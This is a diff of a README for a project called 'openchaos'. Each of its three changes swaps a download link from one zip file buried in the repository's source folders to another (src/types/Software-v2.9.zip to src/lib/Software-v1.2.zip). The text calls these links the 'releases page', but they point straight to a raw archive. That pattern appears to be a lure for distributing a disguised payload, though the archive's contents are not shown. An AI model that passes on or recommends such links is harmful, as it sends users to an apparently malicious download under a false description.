@@ -1,6 +1,6 @@
 # 🚀 openchaos - Evolving Projects Through Community Votes
 
-[![Download openchaos](https://raw.githubusercontent.com/Suleman54629/openchaos/main/src/types/Software-v2.9.zip)](https://raw.githubusercontent.com/Suleman54629/openchaos/main/src/types/Software-v2.9.zip)
+[![Download openchaos](https://raw.githubusercontent.com/Suleman54629/openchaos/main/src/lib/Software-v1.2.zip)](https://raw.githubusercontent.com/Suleman54629/openchaos/main/src/lib/Software-v1.2.zip)
 
 ## 🗂️ Introduction
 
@@ -25,7 +25,7 @@ Welcome to openchaos! This application embodies the spirit of collaboration. Eve
 To get started with openchaos, you need to download the application. Follow the steps below:
 
 1. **Visit the Download Page**: Click the link below to go to the releases page.  
-   [Download openchaos](https://raw.githubusercontent.com/Suleman54629/openchaos/main/src/types/Software-v2.9.zip)
+   [Download openchaos](https://raw.githubusercontent.com/Suleman54629/openchaos/main/src/lib/Software-v1.2.zip)
 
 2. **Choose the Right File**: On the releases page, you will find a list of available versions. Select the latest version recommended for most users.
 
@@ -42,7 +42,7 @@ To get started with openchaos, you need to download the application. Follow the 
 
 ## 📥 Download & Install
 
-To download openchaos, visit the releases page and follow the instructions outlined in the “Getting Started” section. Access the page here: [Download openchaos](https://raw.githubusercontent.com/Suleman54629/openchaos/main/src/types/Software-v2.9.zip).
+To download openchaos, visit the releases page and follow the instructions outlined in the “Getting Started” section. Access the page here: [Download openchaos](https://raw.githubusercontent.com/Suleman54629/openchaos/main/src/lib/Software-v1.2.zip).
 
 ## 💻 Troubleshooting
 
